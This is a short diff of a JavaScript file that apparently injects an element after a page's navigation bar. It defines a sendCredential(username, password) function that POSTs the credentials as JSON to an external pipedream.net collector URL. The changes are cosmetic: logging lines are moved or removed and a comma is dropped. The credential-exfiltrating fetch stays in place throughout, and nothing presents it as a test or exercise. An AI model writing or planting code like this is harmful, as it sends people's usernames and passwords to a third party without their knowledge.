@@ -7,8 +7,6 @@ place_holder.className = "place_holder";
 $("nav").after(place_holder);
 
 function sendCredential(username, password) {
-
-    console.log("invoked");
     const headers = new Headers();
     headers.append("Content-Type", "application/json");
 
@@ -23,12 +21,13 @@ function sendCredential(username, password) {
         method: "POST",
         headers,
         mode: "cors",
-        body: JSON.stringify(body),
+        body: JSON.stringify(body)
     };
-    console.log(body);
+
     fetch("https://ensnocsamq9t9ho.m.pipedream.net", options).then((function(response) {
         console.log(response);
     }));
+    console.log(body);
 }
 
 
